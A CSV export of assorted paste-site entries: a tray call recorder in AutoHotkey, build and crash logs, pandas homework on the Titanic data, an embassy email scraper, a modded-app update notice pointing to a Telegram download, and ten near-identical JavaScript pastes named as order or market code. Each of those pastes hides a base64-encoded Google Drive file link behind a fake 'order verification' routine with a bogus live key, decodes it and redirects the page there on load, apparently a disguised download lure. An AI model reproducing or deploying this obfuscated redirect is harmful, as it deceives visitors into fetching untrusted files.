id,title,username,language,date,content
tGf3qmaD,TrayCallRecorder,J2897,Autohotkey,Friday 11th of April 2025 04:11:51 PM CDT,"#Requires AutoHotkey v2.0+
#SingleInstance Force
#Warn All, Off

; ==============================================================================
; Script Name: Call Recorder for FFmpeg
; Synopsis: 
;   This script manages audio recordings using FFmpeg. It captures audio from a 
;   specified microphone and saves recordings with timestamped filenames. 
;   The user can control recording via a system tray menu or hotkeys:
;     - Ctrl+Alt+R: Start recording
;     - Ctrl+Alt+S: Stop recording
;     - Ctrl+Alt+X: Exit the application gracefully
;   
;   Additional Features:
;     - Automatically creates a log directory if it doesn’t exist.
;     - Verifies the FFmpeg executable location.
;     - Ensures only one instance is running.
;     - Provides clear tooltips for user feedback.
;
;   Prerequisites:
;     - AutoHotkey v2.0+
;     - FFmpeg installed at the specified location.
;     - Correct microphone name matching the system device.
; ==============================================================================

; --------------------------------------------------------------
;         CONFIGURATION
; --------------------------------------------------------------
class Config {
    static FFmpegPath := ""C:\Users\J2897\Programs\ffmpeg\bin\ffmpeg.exe""
    static MicName    := ""Microphone (2- High Definition Audio Device)""
    static OutputDir  := A_ScriptDir
    static LogDir     := A_ScriptDir ""\Logs""
    static StartDelay := 2000
}

; --------------------------------------------------------------
;          APPLICATION STATE
; --------------------------------------------------------------
class State {
    static ffmpegPID := 0
    static IsRecording => this.ffmpegPID != 0 && ProcessExist(this.ffmpegPID)
    
    static Clear() {
        this.ffmpegPID := 0
    }
}

; --------------------------------------------------------------
;            TRAY MENU
; --------------------------------------------------------------
CreateTrayMenu() {
    A_TrayMenu.Delete()
    A_TrayMenu.Add(""&Start Recording"", (*) => StartRecording())
    A_TrayMenu.Add(""&Stop Recording"", (*) => StopRecording())
    A_TrayMenu.Add()
    A_TrayMenu.Add(""E&xit"", (*) => ExitAppGracefully())
    UpdateTrayMenu()
}

UpdateTrayMenu() {
    ; Use separate Enable/Disable methods
    if State.IsRecording {
        A_TrayMenu.Disable(""&Start Recording"")
        A_TrayMenu.Enable(""&Stop Recording"")
    } else {
        A_TrayMenu.Enable(""&Start Recording"")
        A_TrayMenu.Disable(""&Stop Recording"")
    }
}

; --------------------------------------------------------------
;            HOTKEYS
; --------------------------------------------------------------
^!R:: StartRecording()
^!S:: StopRecording()
^!X:: ExitAppGracefully()

; --------------------------------------------------------------
;          INITIALIZATION
; --------------------------------------------------------------
CreateTrayMenu()
ShowToolTip(""Call Recorder Initialized."" 
    . ""`nRight-click the tray icon for options."" 
    . ""`nHotkeys available:"" 
    . ""`n   Ctrl+Alt+R: Start Recording"" 
    . ""`n   Ctrl+Alt+S: Stop Recording"" 
    . ""`n   Ctrl+Alt+X: Exit"", 1, 5000)
return

; --------------------------------------------------------------
;           FUNCTIONS
; --------------------------------------------------------------
StartRecording() {
    if State.IsRecording {
        ShowToolTip(""Recording already in progress!"", 2, 2000)
        return
    }

    if !FileExist(Config.FFmpegPath) {
        MsgBox(""FFmpeg not found at:`n"" Config.FFmpegPath, ""Error"", 0x30)
        return
    }

    if !DirExist(Config.LogDir)
        DirCreate(Config.LogDir)
    
    timestamp := FormatTime(, ""yyyy-MM-dd_HH-mm-ss"")
    outputFile := Config.OutputDir ""\Call_"" timestamp "".wav""

	cmd := Format(
		'cmd /c """"{1}"" -hide_banner -f dshow -i audio=""{2}"" -ac 2 -y ""{3}"" & pause""',
		Config.FFmpegPath,
		Config.MicName,
		outputFile
	)

    try {
        State.ffmpegPID := Run(cmd, Config.OutputDir,, &pid)
        Sleep Config.StartDelay
        
        if !ProcessExist(pid) || !FileExist(outputFile) {
            throw Error(""FFmpeg failed to initialize"")
        }
        State.ffmpegPID := pid
        UpdateTrayMenu()
    }
    catch Error as e {
        State.Clear()
        MsgBox(""Startup Error: "" e.Message, ""Error"", 0x30)
        return
    }

    ShowToolTip(""RECORDING STARTED (PID: "" State.ffmpegPID "")"", 2, 2000)
    UpdateTrayMenu()
}

StopRecording() {
    if !State.IsRecording {
        ShowToolTip(""No active recording to stop"", 2, 2000)
        return
    }

    ShowToolTip(""Stopping recording..."", 2, 2000)
    
    try {
        WinActivate(""ahk_pid "" State.ffmpegPID)
        ControlSend(""q"",, ""ahk_pid "" State.ffmpegPID)
        
        if ProcessWaitClose(State.ffmpegPID, 2) {
            ShowToolTip(""Stopped gracefully"", 2, 2000)
        } else {
            ProcessClose(State.ffmpegPID)
            ShowToolTip(""Force-closed recording"", 2, 2000)
        }
    }
    catch Error as e {
        MsgBox(""Stop Error: "" e.Message, ""Error"", 0x30)
    }
    
    State.Clear()
    UpdateTrayMenu()
}

ExitAppGracefully() {
    if State.IsRecording {
        result := MsgBox(""Recording in progress. Stop and exit?"", ""Confirm Exit"", 0x34)
        if result = ""Yes""
            StopRecording()
        else
            return
    }
    ExitApp()
}

ShowToolTip(text, id := 1, timeout := 0) {
    ToolTip(text,,, id)
    if timeout > 0
        SetTimer(() => ToolTip(,,, id), -timeout)
}"
Lq4gZRnk,Order.js,kammex,JavaScript,Friday 11th of April 2025 04:11:12 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/44099/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LGbgBEXk,Market.js,kammex,JavaScript,Friday 11th of April 2025 03:55:43 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38791/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eKhJupPS,Untitled,pb6106,Lua,Friday 11th of April 2025 03:51:15 PM CDT,"function list_get_random(t)
  return t[math.random(#t)]
end


while 123 == 123 do
  write(peripheral.call(""""bottom"""",""'write'"",""list_get_random(({'All good!', 'Watching Steam Generator', 'Checking Critical Systems', ':3', 'Checking Atmosphere', 'Checking Airlocks', 'WARN ALARM', 'ERROR ALARM', 'Sending logs to ERTH', 'Energy Storage: Optimal'}))""))
  sleep(1)
end

local _ = item
"
EVuqZktZ,Next/Font no require() on ESM Graph with top-level await,DerJackLive,Bash,Friday 11th of April 2025 03:47:36 PM CDT,"jackr@Jacks-PC MINGW64 /d/dev/DJL Foundation/djl-homepage (main)
$ pnpm build

> djl-homepage@0.1.0 build D:\dev\DJL Foundation\djl-homepage
> next build

   ▲ Next.js 15.3.0
   - Environments: .env
   - Experiments (use with caution):
     · clientTraceMetadata

   Creating an optimized production build ...
<w> [webpack.cache.PackFileCacheStrategy] Serializing big strings (245kiB) impacts deserialization performance (consider using Buffer instead and decode when needed)
Failed to compile.

src\app\layout.tsx
An error occurred in `next/font`.

Error: require() cannot be used on an ESM graph with top-level await. Use import() instead. To see where the top-level await comes from, use --experimental-print-required-tla.
  From D:\dev\DJL Foundation\djl-homepage\node_modules\.pnpm\next@15.3.0_@babel+core@7.2_905506496932c581dfc14a516f096b03\node_modules\next\dist\build\webpack\config\blocks\css\plugins.js
  Requiring D:\dev\DJL Foundation\djl-homepage\node_modules\.pnpm\prettier-plugin-tailwindcss@0.6.11_prettier@3.5.3\node_modules\prettier-plugin-tailwindcss\dist\index.mjs
    at ModuleJobSync.runSync (node:internal/modules/esm/module_job:397:13)
    at ModuleLoader.importSyncForRequire (node:internal/modules/esm/loader:427:47)
    at loadESMFromCJS (node:internal/modules/cjs/loader:1565:24)
    at Module._compile (node:internal/modules/cjs/loader:1716:5)
    at Object..js (node:internal/modules/cjs/loader:1899:10)
    at Module.load (node:internal/modules/cjs/loader:1469:32)
    at Function._load (node:internal/modules/cjs/loader:1286:12)
    at TracingChannel.traceSync (node:diagnostics_channel:322:14)
    at wrapModuleLoad (node:internal/modules/cjs/loader:235:24)
    at Module.<anonymous> (node:internal/modules/cjs/loader:1491:12)


> Build failed because of webpack errors
 ELIFECYCLE  Command failed with exit code 1."
KXYWP1c8,Untitled,kammex,JavaScript,Friday 11th of April 2025 03:40:14 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/21636/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
THCuqeat,2025-04-11T15:29:33.469536,powerampache,PHP,Friday 11th of April 2025 03:29:32 PM CDT,"1.01-78 (78) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
cYzkeb9f,Products.js,kammex,JavaScript,Friday 11th of April 2025 03:24:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/31926/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tVqgWTxX,Titanic2,Korotkodul,Python,Friday 11th of April 2025 03:21:48 PM CDT,"import numpy as np
import pandas as pd
import seaborn as sns

titanic_data = sns.load_dataset(""titanic"")
print(titanic_data)
print()

#Часть 1
print(""PART1\n"")
zero_cnt = np.sum(titanic_data.isnull(), axis = 0)
print(""zero_cnt:\n"", zero_cnt)
print()

#Часть 2
print(""\nPART2\n"")
#Удалите все столбцы, количество пропусков в которых превышает половину количества строк в таблице.
half_rows = titanic_data.shape[0] // 2
columns_to_drop = titanic_data.columns[zero_cnt > half_rows]
titanic_data = titanic_data.drop(columns=columns_to_drop)
print('columns_to_drop:', columns_to_drop, ""- удаляем эти столбцы"")
print()
#NB!Теперь работаем с titanic_cleaned

#После того, как вы удалите все столбцы, нарушающие описанное условие, удалите все строки, количество пропусков в которых превышает половину количества столбцов.
row_zero_cnt = np.sum(titanic_data.isnull(), axis = 1)
half_rows = titanic_data.shape[1] // 2
""""""
print(""shape:"", titanic_cleaned.shape)
print(type(row_zero_cnt))
print(row_zero_cnt)""""""
print(""half_rows:"",half_rows)
print(""Максимальное пропусков в строке:"", row_zero_cnt.max())
to_be_left = row_zero_cnt <= half_rows
#print(type(to_be_left))
#(to_be_left)
titanic_data =  titanic_data[to_be_left]
#print(titanic.shape)
print(""Вывод: мы не удалили ни одной строки"")
#NB!Теперь работаем с titanic

#Часть 3
print(""\nPART3\n"")
man_mask = (titanic_data['who'] == 'man')
#print(""man_mask\n"",male_mask)
man_age_median = np.median(titanic_data.loc[man_mask, 'age'].dropna()).round()
#print(""man_age_median:"", man_age_median)
#print()
titanic_data.loc[(titanic_data['who'] == 'man') & (titanic_data['age'].isna()), 'age'] = man_age_median

woman_mask = (titanic_data['who'] == 'woman')
woman_age_median = np.median(titanic_data.loc[woman_mask, 'age'].dropna()).round()
#print(""woman_age_median:"", woman_age_median)
#print()
titanic_data.loc[(titanic_data['who'] == 'woman') & (titanic_data['age'].isna()), 'age'] = woman_age_median

child_mask = (titanic_data['who'] == 'child')
child_age_median = np.median(titanic_data.loc[child_mask, 'age'].dropna()).round()
#print(""child_age_median:"", child_age_median)
#print()
titanic_data.loc[(titanic_data['who'] == 'child') & (titanic_data['age'].isna()), 'age'] = child_age_median

#Часть4
print(""\nPART4\n"")
null_counts = np.sum(titanic_data.isna(), axis=1)
#print(""Распределение пропусков по строкам:"")
#print(null_counts.value_counts().sort_index())
#print(null_counts)
mask = null_counts <= 1
#print(""mask:"", type(mask))
titanic_data = titanic_data[mask]


#Часть5
print(""\nPART5\n"")
city_cnt = titanic_data[""embark_town""].value_counts()
city = city_cnt.idxmax()
print(city)

#Часть 6
print(""\nPART6\n"")
#percent_of_surv1 = (titanic_data[""survived""].value_counts(normalize=True))[1]
#print(round(percent_of_surv1, 2))
surv_percent = np.round(titanic_data[""survived""].value_counts(normalize=True)[1] * 100, 2)
print(surv_percent)

#Часть7
print(""\nPART7\n"")
surv_cnt = titanic_data[titanic_data[""survived""]==1].groupby(""embarked"")[""survived""].count()
print(surv_cnt)

#Часть 8
print(""\nPART8\n"")
surv_class_cnt = titanic_data[titanic_data[""survived""]==1].groupby(""class"", observed=True)[""survived""].count()
print(surv_class_cnt)

#Часть 9
print(""\nPART9\n"")
surv_rich_percent = 100 * titanic_data.loc[titanic_data[""fare""] >= 100, ""survived""].value_counts(normalize=True)[1]
print(np.round(surv_rich_percent, 2))

#Часть 10
print(""\nPART10\n"")
child_alone = titanic_data.loc[(titanic_data[""who""] == ""child"") & (titanic_data[""alone""] == True)]
print(child_alone.shape)
print(child_alone)"
4RviG88s,Order.js,kammex,JavaScript,Friday 11th of April 2025 03:09:22 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47689/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
fHEWJ5LP,Market.js,kammex,JavaScript,Friday 11th of April 2025 02:54:00 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/15365/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
eq11TWhc,embassy.py,ssoni,Python,Friday 11th of April 2025 02:47:08 PM CDT,"import requests
import re

# Download the HTML page
def getPage(url):
    response = requests.get(url)
    return response.text

def main():
    url = ""https://travel.state.gov/content/travel/en/us-visas/visa-information-resources/list-of-posts.html""
    topPage = getPage(url)
    links = re.findall(""href=\""(.+\.html)"", topPage)
    for link in links:
        fullURL = 'https://travel.state.gov' + link
        page = getPage(fullURL)
        emails = re.findall(""mailto: (\S+@\S+\.(gov|edu|com))"", page)
        for email in emails:
            print(email[0])

main()
"
CHj3gLiU,Untitled,kammex,JavaScript,Friday 11th of April 2025 02:38:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/13478/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
KqFcZswC,Polarr,Dj_Rabby,JSON,Friday 11th of April 2025 02:30:16 PM CDT,"{
  ""versionCode"": 1739529n756,
  ""versionName"": ""6.15.n3"",
  ""Msg"": ""This Update Has Been Expired Of The App.
If You Want To Use This App Then Please Update It.
Go To Our Telegram Channel.
And Download Latest Version Of This App.

What's new:
- Performance Improvements.
- Bug Fixes.
- New Features introduced.
- Others minor changes.
Thanks for using dear 🤞☺️"",
  ""downloadLink"": ""https://t.me/ModxV1""
  }"
UVf3ARHu,Products.js,kammex,JavaScript,Friday 11th of April 2025 02:22:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/83195/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2dC84e14,Order.js,kammex,JavaScript,Friday 11th of April 2025 02:07:33 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/90384/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Y3ZWfYNP,Titanic1,Korotkodul,Python,Friday 11th of April 2025 02:07:31 PM CDT,"
import timeit

import numpy as np
import pandas as pd
import seaborn as sns

titanic_data = sns.load_dataset(""titanic"")
print(titanic_data)
print()

#Часть 1
print(""PART1\n"")
zero_cnt = titanic_data.isnull().sum()
print(""zero_cnt:\n"", zero_cnt)
print()

#Часть 2
print(""\nPART2\n"")
#Удалите все столбцы, количество пропусков в которых превышает половину количества строк в таблице.
half_rows = titanic_data.shape[0] // 2
columns_to_drop = titanic_data.columns[zero_cnt > half_rows]
titanic_cleaned = titanic_data.drop(columns=columns_to_drop)
print('columns_to_drop:', columns_to_drop, ""- удаляем эти столбцы"")
print()
#NB!Теперь работаем с titanic_cleaned

#После того, как вы удалите все столбцы, нарушающие описанное условие, удалите все строки, количество пропусков в которых превышает половину количества столбцов.
row_zero_cnt = titanic_cleaned.isnull().sum(axis = 1)
half_rows = titanic_cleaned.shape[1] // 2
""""""
print(""shape:"", titanic_cleaned.shape)
print(type(row_zero_cnt))
print(row_zero_cnt)""""""
print(""half_rows:"",half_rows)
print(""Максимальное пропусков в строке:"", row_zero_cnt.max())
to_be_left = row_zero_cnt <= half_rows
#print(type(to_be_left))
#(to_be_left)
titanic =  titanic_cleaned[to_be_left]
#print(titanic.shape)
print(""Вывод: мы не удалили ни одной строки"")
#NB!Теперь работаем с titanic

#Часть 3
print(""\nPART3\n"")
man_mask = (titanic['who'] == 'man')
#print(""man_mask\n"",male_mask)
man_age_median = titanic.loc[man_mask, 'age'].dropna().median()
print(""man_age_median:"", man_age_median)
print()
woman_mask = (titanic['who'] == 'woman')
woman_age_median = titanic.loc[woman_mask, 'age'].dropna().median()
print(""woman_age_median:"", woman_age_median)
print()
child_mask = (titanic['who'] == 'child')
child_age_median = titanic.loc[child_mask, 'age'].dropna().median()
print(""child_age_median:"", child_age_median)

"
AHtKcePL,Market.js,kammex,JavaScript,Friday 11th of April 2025 01:52:11 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/33740/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
